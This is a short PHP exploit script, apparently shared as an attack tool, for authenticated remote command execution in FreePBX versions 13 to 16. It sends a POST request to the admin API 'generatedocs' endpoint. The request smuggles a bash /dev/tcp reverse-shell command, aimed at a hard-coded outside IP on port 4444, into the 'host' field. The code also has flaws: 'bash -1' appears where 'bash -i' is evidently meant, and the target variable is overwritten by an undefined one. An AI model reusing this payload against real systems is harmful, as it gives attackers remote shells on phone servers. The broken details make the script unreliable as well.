<?php
///
/// FREEPBX 2023 [13,14,15,16] low level Authenticated RCE 
/// Orginal Difcon || https://www.youtube.com/watch?v=rqFJ0BxwlLI
/// Cod[3]d by Cold z3ro 
///
$url = "remotefreepbx.com";
$backconnectip = "144.217.52.246";
$port = "4444"; 
$PHPSESSID = "any valid seesion even extension";

	echo "checking $url\n";
	$url = trim($line);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://'.$url.'/admin/ajax.php?module=api&command=generatedocs');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
	curl_setopt($ch, CURLOPT_TIMEOUT, 2);
	curl_setopt($ch, CURLOPT_HTTPHEADER, [
		'Referer: http://'.$url.'/admin/config.php?display=api',
		'Content-Type: application/x-www-form-urlencoded',
	]);
	curl_setopt($ch, CURLOPT_COOKIE, 'PHPSESSID='.$PHPSESSID);
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(bash -1 >%26 /dev/tcp/'.$backconnectip.'/4444 0>%261)');
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

	echo $response = curl_exec($ch)."\n";

	curl_close($ch);

?>